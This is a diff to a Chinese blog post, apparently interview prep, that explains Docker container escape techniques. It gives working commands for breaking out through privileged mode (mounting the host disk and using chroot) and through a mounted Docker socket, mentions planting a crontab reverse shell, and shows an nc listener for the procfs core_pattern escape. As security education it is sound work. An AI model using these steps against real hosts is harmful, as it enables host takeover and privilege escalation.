@@ -135,13 +135,130 @@ User Namespaces 是 Linux 内核提供的一种隔离机制，可以将容器内
 但是，这个 User Namespaces **不是默认开启的**，需要在 Docker 的配置文件中进行设置。
 也就是说，**默认情况下，Docker 里的 root 跟宿主机的 root 就是一回事**，被面试官忽悠了，绷。
 
-以下面的挂载 procfs 逃逸为例，没开 User Namespaces 的情况下，宿主机的 root 直接就被拿下了。
+以下文提到的挂载 procfs 逃逸为例，没开 User Namespaces 的情况下，宿主机的 root 直接就被拿下了。
 
 ## Docker 逃逸
 
 ### 特权模式
 
+emmmm 感觉没什么好解释的，顾明思义已经是特权模式了，想干嘛都行。
+
+先启动一个特权模式的容器
+
+```bash
+docker run --rm --privileged=true -it alpine
+```
+
+执行如下命令检测一下
+
+```bash
+cat /proc/self/status | grep CapEff
+```
+
+若为 `0000003fffffffff` 或 `0000001fffffffff`，则表示为特权模式，拥有所有的 Capabilities
+
+查看一下挂载磁盘设备
+
+```bash
+fdisk -l
+```
+
+吔？好像跟别人说的不太一样
+
+```bash
+# fdisk -l
+Disk /dev/fd0: 1 MB, 1474560 bytes, 2880 sectors
+1 cylinders, 145 heads, 16 sectors/track
+Units: sectors of 1 * 512 = 512 bytes
+
+Device   Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
+/dev/fd0p1 90 656,144,16  656,144,16  2425393296  555819295 2425393296 1156G 90 Unknown
+Partition 1 has different physical/logical start (non-Linux?):
+     phys=(656,144,16) logical=(1045428,21,1)
+Partition 1 has different physical/logical end:
+     phys=(656,144,16) logical=(239577,40,16)
+/dev/fd0p2 90 656,144,16  656,144,16  2425393296  555819295 2425393296 1156G 90 Unknown
+Partition 2 has different physical/logical start (non-Linux?):
+     phys=(656,144,16) logical=(1045428,21,1)
+Partition 2 has different physical/logical end:
+     phys=(656,144,16) logical=(239577,40,16)
+/dev/fd0p3 90 656,144,16  656,144,16  2425393296  555819295 2425393296 1156G 90 Unknown
+Partition 3 has different physical/logical start (non-Linux?):
+     phys=(656,144,16) logical=(1045428,21,1)
+Partition 3 has different physical/logical end:
+     phys=(656,144,16) logical=(239577,40,16)
+/dev/fd0p4 90 656,144,16  656,144,16  2425393296  555819295 2425393296 1156G 90 Unknown
+Partition 4 has different physical/logical start (non-Linux?):
+     phys=(656,144,16) logical=(1045428,21,1)
+Partition 4 has different physical/logical end:
+     phys=(656,144,16) logical=(239577,40,16)
+Found valid GPT with protective MBR; using GPT
+
+Disk /dev/sda: 41943040 sectors,     0
+Logical sector size: 512
+Disk identifier (GUID): 247954d6-7c12-4470-9429-09ba67b1bfc5
+Partition table holds up to 128 entries
+First usable sector is 34, last usable sector is 41943006
+
+Number  Start (sector)    End (sector)  Size Name
+     1            2048            4095 1024K
+     2            4096         1054719  513M EFI System Partition
+     3         1054720        41940991 19.4G
+```
+
+应该是虚拟机导致的。
+尝试了下上面那几个奇怪的玩意实际是不存在的，然后一直试到 `/dev/sda3` 就挂载上了
+
+```bash
+mount /dev/sda3 /mnt
+```
+
+宿主机的根目录就挂载上去了，`cd` 进去再 `chroot .` 即可。
+当然写 crontab 挂一个反弹 shell 也可以。
+
 ### 挂载 Docker Socket
+
+Docker Socket 是 Docker 的一个 Unix Socket 文件，默认路径为 `/var/run/docker.sock`，它允许用户通过 Docker CLI 与 Docker 守护进程进行通信。
+
+创建一个容器并挂载 Docker Socket
+
+```bash
+docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu
+```
+
+容器里面安装一下 Docker
+
+```bash
+docker exec -it with_docker_sock /bin/bash
+apt-get update
+apt-get install curl -y
+curl -fsSL https://get.docker.com/ | sh
+```
+
+查看是否存在 Docker Socket
+
+```bash
+ls -lah /var/run/docker.sock
+```
+
+若存在则说明这个漏洞可能存在，创建一个容器并挂载宿主机的根目录即可
+
+```bash
+docker run -it -v /:/mnt/ ubuntu
+```
+
+然后还是 `cd /mnt` 进去，`chroot .` 就逃逸出来了。
+
+原理也很简单，我们现在 review 一下 Docker 启动一个容器的流程：
+
+1. 命令行解析：Docker CLI 解析用户输入的命令行参数。
+2. **API 调用：Docker CLI 通过 HTTP API 调用 Docker 守护进程。**
+3. Dockerd 处理请求：Docker 守护进程接收请求并解析参数。
+4. Containerd 和 runc：Docker 守护进程将请求传递给 containerd，containerd 负责容器的生命周期管理。runc 是一个低级别的容器运行时，负责创建和管理容器的命名空间、cgroups 等。
+
+注意到上面加粗的文字，没错，就是在那里，Docker Socket 实际上是一个 Unix Socket 文件，Docker 守护进程通过这个文件接收来自 Docker CLI 的请求。
+
+那就不难理解了，你把 Docker Socket 挂载到容器里，容器与这个 Socket 文件通信时，实际上是与宿主机的 Docker 守护进程通信，也就能随便操控宿主机的资源了。
 
 ### 挂载 procfs
 
@@ -235,7 +352,7 @@ nc -lvnp <your_host_port>
 
 宿主机 root 的 shell 就弹出来了。
 
-现在说说原理：Linux 有一个核心转储（core dump）机制，当进程崩溃时，内核会将进程的内存映像保存到一个文件，用于调试。
+现在说说原理：Linux 有一个核心转储（core dump）机制（这中文听着怪怪的哈），当进程崩溃时，内核会将进程的内存映像保存到一个文件，用于调试。
 
 而 `/proc/sys/kernel/core_pattern` 定义了核心转储文件的生成规则。其格式分为现和：
 
@@ -262,6 +379,7 @@ OverlayFS 需要四个目录：
 **删除**文件时，会在 `upperdir` 中标记一个“删除白板”，隐藏下层文件。
 最终效果：通过 `merged` 目录，用户可以看到一个合并后的完整的文件系统视图，原始基础镜像（lowerdir）始终不变。
 
+注意到上面提到的**写时复制**，这是应用非常广泛的一种设计模式。
 可以概括出如下优点：
 
 - **高效**：无需复制整个基础层，只有修改时才复制单个文件。
